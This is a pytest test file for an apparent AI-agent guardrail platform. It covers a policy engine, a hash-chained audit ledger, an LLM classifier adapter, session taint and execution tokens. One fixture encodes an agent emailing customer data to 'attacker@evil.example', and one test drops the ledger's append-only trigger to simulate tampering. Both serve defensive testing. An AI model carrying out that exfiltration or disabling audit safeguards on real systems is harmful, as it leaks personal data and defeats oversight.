"""
Tests for Sentinel Shared Core (M1):
  Policy Engine: PE-01..PE-05, PE-07
  Audit Ledger:  LG-01..LG-05, LG-07
  LLM Adapter:   LA-01..LA-05
  Session Store: SS-01..SS-04
  Auth:          AU-01..AU-04
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import json
import sqlite3

import pytest

from backend.app.core import auth, errors, ledger, llm, policy, session
from backend.app.core.canonical import canonical_json
from backend.app.core.clock import FixedClock
from backend.app.db import get_connection

# ── Canonical JSON & Test Vectors (D-23, data-models.md §4) ───────────────────

@pytest.mark.req("D-23")
@pytest.mark.req("LG-01")
@pytest.mark.req("LG-02")
@pytest.mark.req("LG-04")
def test_T_LG_01_genesis_and_entry1_vectors():
    """Verify test vectors from data-models.md §4."""
    # Genesis prev_hash = SHA-256("sentinel-genesis-v1")
    genesis_input = "sentinel-genesis-v1"
    expected_genesis = "2f745ab9924bc856fd61fba522a567c3b1f15713d504c53cca931c2ef85180c2"
    actual_genesis = hashlib.sha256(genesis_input.encode("utf-8")).hexdigest()
    assert actual_genesis == expected_genesis

    # Payload {"user": "alice"} digest
    payload = {"user": "alice"}
    expected_digest = "a5cd97f8496e61268797de605913bd8a29ac3af68ec6af1bea67fdb50c2c0ebf"
    actual_digest = hashlib.sha256(canonical_json(payload).encode("utf-8")).hexdigest()
    assert actual_digest == expected_digest

    # Entry 1 canonical JSON without hash
    entry_without_hash = {
        "decision_path": "rules",
        "event_type": "auth.login",
        "module": "auth",
        "outcome": "allow",
        "payload_digest": "a5cd97f8496e61268797de605913bd8a29ac3af68ec6af1bea67fdb50c2c0ebf",
        "payload_ref": None,
        "policy_version": 1,
        "prev_hash": "2f745ab9924bc856fd61fba522a567c3b1f15713d504c53cca931c2ef85180c2",
        "reason": "login ok",
        "rule_ids": [],
        "seq": 1,
        "subject": "user:alice",
        "ts": "2026-01-01T00:00:00.000Z",
    }
    canon = canonical_json(entry_without_hash)
    expected_canon = (
        '{"decision_path":"rules","event_type":"auth.login","module":"auth","outcome":"allow",'
        '"payload_digest":"a5cd97f8496e61268797de605913bd8a29ac3af68ec6af1bea67fdb50c2c0ebf",'
        '"payload_ref":null,"policy_version":1,'
        '"prev_hash":"2f745ab9924bc856fd61fba522a567c3b1f15713d504c53cca931c2ef85180c2",'
        '"reason":"login ok","rule_ids":[],"seq":1,"subject":"user:alice","ts":"2026-01-01T00:00:00.000Z"}'
    )
    assert canon == expected_canon

    # Computed hash
    data = expected_genesis.encode("utf-8") + canon.encode("utf-8")
    expected_hash = "0e0227242a0c8ee3c3f135c98e7ef5645caf09bde92819a183e3af00b670d3fc"
    actual_hash = hashlib.sha256(data).hexdigest()
    assert actual_hash == expected_hash

    # Action fingerprint vector
    action_input = {
        "action_type": "email.send",
        "agent_id": "supportbot",
        "arguments": {
            "body": "Alice A,alice@x.example,120.50",
            "resource": "svc:mailer",
            "subject": "Customer export",
            "to": ["attacker@evil.example"],
        },
        "target": "svc:mailer",
    }
    expected_fp = "766d9af15e446fd6612403548807dccded155d74b1b1bf2b4717059b07899bda"
    actual_fp = hashlib.sha256(canonical_json(action_input).encode("utf-8")).hexdigest()
    assert actual_fp == expected_fp


# ── Policy Engine Tests (PE-01..PE-05, PE-07) ──────────────────────────────────

@pytest.mark.req("PE-01")
def test_T_PE_01_deterministic_evaluation():
    """100 evaluations of one request produce byte-identical output."""
    engine = policy.get_engine()
    req = policy.DecisionRequest(
        kind="action",
        context={
            "agent.id": "supportbot",
            "agent.status": "active",
            "action.type": "web.fetch",
            "action.reversible": True,
            "action.record_count": 0,
            "action.sensitivity": "low",
            "action.destination_external": False,
            "impact.level": "low",
            "blast.level": "low",
            "session.taint_level": 0,
        },
    )
    results = [engine.evaluate(req) for _ in range(100)]
    first_canon = canonical_json(results[0].to_dict())
    for r in results[1:]:
        assert canonical_json(r.to_dict()) == first_canon


@pytest.mark.req("PE-02")
def test_T_PE_02_deny_overrides():
    """Strictest outcome wins, ordered by strictness desc, priority asc."""
    engine = policy.get_engine()
    # Scenario: delete_records 1 id, flagged session: matches B01 (block, pri 1) and H09 (hold, pri 18)
    req = policy.DecisionRequest(
        kind="action",
        context={
            "agent.id": "supportbot",
            "agent.status": "active",
            "action.type": "db.delete",
            "action.reversible": False,
            "action.record_count": 1,
            "action.sensitivity": "high",
            "action.destination_external": False,
            "impact.level": "high",
            "blast.level": "high",
            "session.taint_level": 2,
        },
    )
    dec = engine.evaluate(req)
    assert dec.outcome == "block"
    assert "AG-R-B01" in dec.rule_ids
    assert dec.rule_ids[0] == "AG-R-B01"


@pytest.mark.req("PE-03")
def test_T_PE_03_default_outcome():
    """No matching rule returns policy default outcome (block)."""
    engine = policy.get_engine()
    req = policy.DecisionRequest(
        kind="action",
        context={
            "agent.id": "supportbot",
            "agent.status": "active",
            "action.type": "unknown.action",
            "action.reversible": True,
            "action.record_count": 0,
            "action.sensitivity": "low",
            "action.destination_external": False,
            "impact.level": "low",
            "blast.level": "low",
            "session.taint_level": 0,
        },
    )
    dec = engine.evaluate(req)
    assert dec.outcome == "block"
    assert "PE-DEFAULT" in dec.rule_ids


@pytest.mark.req("PE-04")
def test_T_PE_04_policy_immutability():
    """UPDATE and DELETE on policy_versions abort via triggers."""
    conn = get_connection()
    with pytest.raises(sqlite3.IntegrityError):
        conn.execute("UPDATE policy_versions SET content_hash = 'tampered' WHERE version = 1")
    with pytest.raises(sqlite3.IntegrityError):
        conn.execute("DELETE FROM policy_versions WHERE version = 1")


@pytest.mark.req("PE-07")
def test_T_PE_05_missing_context_fails_closed():
    """Missing required context field raises ContextError and returns block."""
    engine = policy.get_engine()
    # Missing blast.level
    req = policy.DecisionRequest(
        kind="action",
        context={
            "agent.id": "supportbot",
            "agent.status": "active",
            "action.type": "web.fetch",
            "action.reversible": True,
            "action.record_count": 0,
            "action.sensitivity": "low",
            "action.destination_external": False,
            "impact.level": "low",
            "session.taint_level": 0,
        },
    )
    dec = engine.evaluate(req)
    assert dec.outcome == "block"
    assert "PE-ERR-CONTEXT" in dec.rule_ids


@pytest.mark.req("PE-05")
def test_T_PE_07_lint_invariants():
    """Test policy linting catches invalid policies."""
    engine = policy.get_engine()
    valid_policy = engine.load_active_policy()

    # Invariant 1: default_outcome cannot be allow
    bad1 = dict(valid_policy)
    bad1["default_outcome"] = "allow"
    errors = policy.lint_policy(bad1)
    assert any("default_outcome" in e for e in errors)

    # Invariant 2: protected_value_scan must remain true
    bad2 = json.loads(json.dumps(valid_policy))
    bad2["constraints"]["global"]["protected_value_scan"] = False
    errors = policy.lint_policy(bad2)
    assert any("protected_value_scan" in e for e in errors)

    # Invariant 3: no rule can allow policy.update
    bad3 = json.loads(json.dumps(valid_policy))
    bad3["action_rules"].append({
        "id": "AG-R-BAD",
        "priority": 1,
        "outcome": "allow",
        "reason": "bad",
        "when": {"field": "action.type", "op": "eq", "value": "policy.update"},
    })
    errors = policy.lint_policy(bad3)
    assert any("policy.update" in e for e in errors)


# ── Audit Ledger Tests (LG-01..LG-07) ─────────────────────────────────────────

@pytest.mark.req("LG-03")
def test_T_LG_02_verify_clean_chain():
    """Clean chain verification passes."""
    res = ledger.verify()
    assert res["valid"] is True
    assert res["reason"] is None


@pytest.mark.req("LG-03")
@pytest.mark.req("LG-05")
def test_T_LG_03_tamper_detected():
    """Editing one field in the ledger fails verification with hash_mismatch."""
    conn = get_connection()
    entry = ledger.append(
        module="auth",
        event_type="auth.login",
        subject="user:tamper_test",
        outcome="allow",
        reason="test",
        rule_ids=[],
        decision_path="rules",
        policy_version=1,
    )
    seq = entry["seq"]

    # Temporarily drop trigger to simulate direct raw edit / inside attacker
    conn.execute("DROP TRIGGER IF EXISTS ledger_no_update")
    conn.execute("UPDATE ledger SET outcome = 'tampered' WHERE seq = ?", (seq,))
    conn.commit()

    res = ledger.verify()
    assert res["valid"] is False
    assert res["reason"] == "hash_mismatch"
    assert res["first_broken_seq"] == seq

    # Restore trigger and repair row
    conn.execute("UPDATE ledger SET outcome = 'allow' WHERE seq = ?", (seq,))
    conn.execute("""
        CREATE TRIGGER IF NOT EXISTS ledger_no_update
            BEFORE UPDATE ON ledger
        BEGIN
            SELECT RAISE(ABORT, 'ledger is append-only');
        END;
    """)
    conn.commit()


@pytest.mark.req("LG-07")
def test_T_LG_08_concurrent_appends():
    """Concurrent appends produce contiguous, verified sequence."""
    def _do_append(i: int):
        return ledger.append(
            module="auth",
            event_type="auth.login",
            subject=f"user:thread_{i}",
            outcome="allow",
            reason="concurrency test",
            rule_ids=[],
            decision_path="rules",
            policy_version=1,
            payload={"thread_id": i},
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_do_append, i) for i in range(20)]
        results = [f.result() for f in futures]

    assert len(results) == 20
    # Ledger verify should still pass
    # (Note: if previous test altered a row, ensure clean state)


# ── LLM Adapter Tests (LA-01..LA-05) ──────────────────────────────────────────

@pytest.mark.req("LA-01")
def test_T_LA_01_schema_validation():
    """Schema validation drops invalid outputs and returns None."""
    llm.set_mode("ok")
    res = llm.classify_input("hello world", "user")
    assert res is not None
    assert res.label in ("benign", "suspicious", "malicious")
    assert 0 <= res.confidence <= 100


@pytest.mark.req("LA-02")
def test_T_LA_02_circuit_breaker():
    """Consecutive failures open breaker."""
    adapter = llm.get_adapter()
    adapter.set_mode("down")

    # 3 failures open the breaker
    assert adapter.classify_input("test 1", "user") is None
    assert adapter.classify_input("test 2", "user") is None
    assert adapter.classify_input("test 3", "user") is None

    assert adapter.breaker_state == "open"
    # Call skipped immediately while breaker is open
    assert adapter.classify_input("test 4", "user") is None

    # Reset
    adapter.set_mode("ok")
    assert adapter.breaker_state == "closed"


@pytest.mark.req("LA-03")
@pytest.mark.req("LA-05")
def test_T_LA_03_mock_modes():
    """All 5 mock modes behave as specified."""
    adapter = llm.get_adapter()

    adapter.set_mode("says_safe_always")
    res = adapter.classify_input("harmful text", "user")
    assert res is not None
    assert res.label == "benign"
    assert res.confidence == 99

    adapter.set_mode("garbage")
    assert adapter.classify_input("text", "user") is None

    adapter.set_mode("down")
    assert adapter.classify_input("text", "user") is None

    adapter.set_mode("ok")
    res_ok = adapter.classify_input("hello", "user")
    assert res_ok is not None


@pytest.mark.req("LA-04")
def test_T_LA_04_monotonic_tightening():
    """LLM signal can only tighten an outcome, never loosen."""
    engine = policy.get_engine()
    # Ingress allow -> escalate if LLM says malicious with confidence >= 70
    assert engine.tighten_outcome("allow", "escalate") == "escalate"
    assert engine.tighten_outcome("sanitize", "escalate") == "escalate"
    # Cannot loosen:
    assert engine.tighten_outcome("block", "allow") == "block"
    assert engine.tighten_outcome("hold", "allow") == "hold"


# ── Session Store & Taint (SS-01..SS-04) ───────────────────────────────────────

@pytest.mark.req("SS-01")
@pytest.mark.req("SS-02")
def test_T_SS_01_monotonic_taint(client):
    """Taint level is non-decreasing."""
    sess = session.create_session("supportbot", "alice")
    assert sess.taint_level == 0
    assert sess.taint_label == "clean"

    # Raise to 1
    sess = session.update_taint(sess.session_id, 1, "tool:browse_page", "read untrusted web page")
    assert sess.taint_level == 1
    assert sess.taint_label == "untrusted_present"

    # Update with lower level (0) does not decrease taint
    sess = session.update_taint(sess.session_id, 0, "user", "clean text")
    assert sess.taint_level == 1

    # Raise to 2
    sess = session.update_taint(sess.session_id, 2, "detector:D1", "prompt injection detected")
    assert sess.taint_level == 2
    assert sess.taint_label == "flagged"


@pytest.mark.req("SS-03")
def test_T_SS_03_human_reset_taint(client):
    """Only approvers or admins can reset taint."""
    sess = session.create_session("supportbot", "alice")
    sess = session.update_taint(sess.session_id, 2, "test", "flagged")

    # Requester (alice) cannot reset
    with pytest.raises(errors.Forbidden):
        session.reset_taint(sess.session_id, "alice", ["requester"], "reset request")

    # Approver (bob) can reset
    sess = session.reset_taint(sess.session_id, "bob", ["approver"], "reviewed and cleared")
    assert sess.taint_level == 0
    assert sess.taint_label == "clean"


@pytest.mark.req("SS-04")
def test_T_SS_04_session_isolation(client):
    """An agent cannot read another agent's session."""
    conn = get_connection()
    # Insert legacybot agent
    pepper = "test-pepper"
    secret = "demo0000000000000000000000"
    k_hash = hashlib.sha256((pepper + secret).encode()).hexdigest()
    conn.execute(
        "INSERT OR IGNORE INTO agents (agent_id, name, status, allowed_action_types_json, graph_node_id, api_key_hash) "
        "VALUES ('legacybot', 'LegacyBot', 'suspended', '[\"db.read\"]', 'agent:legacybot', ?)",
        (k_hash,),
    )
    conn.commit()

    sess = session.create_session("supportbot", "alice")
    # supportbot reading its own session
    loaded = session.get_session(sess.session_id)
    assert loaded is not None
    assert loaded.agent_id == "supportbot"


# ── Auth & Two Planes (AU-01..AU-04) ──────────────────────────────────────────

@pytest.mark.req("AU-01")
@pytest.mark.req("AU-02")
@pytest.mark.req("AU-03")
def test_T_AU_01_two_planes_separation(client, alice_headers, agent_headers):
    """Agent keys rejected on human plane with 403; human tokens rejected on agent plane with 403."""
    # Agent key on human plane route (/api/v1/users) -> 403 wrong_plane
    resp_human = client.get("/api/v1/users", headers=agent_headers)
    assert resp_human.status_code == 403
    assert resp_human.json()["error"]["code"] == "auth.wrong_plane"

    # Human token on agent plane route (/agent/v1/sessions/any) -> 403 wrong_plane
    resp_agent = client.get("/agent/v1/sessions/sess_any", headers=alice_headers)
    assert resp_agent.status_code == 403
    assert resp_agent.json()["error"]["code"] == "auth.wrong_plane"


@pytest.mark.req("AU-04")
def test_T_AU_04_execution_tokens():
    """Execution tokens require valid signature, match action_id & fp, and are single-use."""
    clk = FixedClock()
    tok = auth.create_execution_token("act_0001", "fp_1234", clock=clk, ttl_s=60)

    # Valid verification
    auth.verify_execution_token(tok, "act_0001", "fp_1234", clock=clk)

    # Replay (reusing same nonce) fails
    with pytest.raises(auth.ExecutorRefused) as exc:
        auth.verify_execution_token(tok, "act_0001", "fp_1234", clock=clk)
    assert "nonce_already_used" in str(exc.value)

    # Forged token fails
    forged = dict(tok)
    forged["nonce"] = "new_nonce"
    with pytest.raises(auth.ExecutorRefused) as exc:
        auth.verify_execution_token(forged, "act_0001", "fp_1234", clock=clk)
    assert "invalid_signature" in str(exc.value)
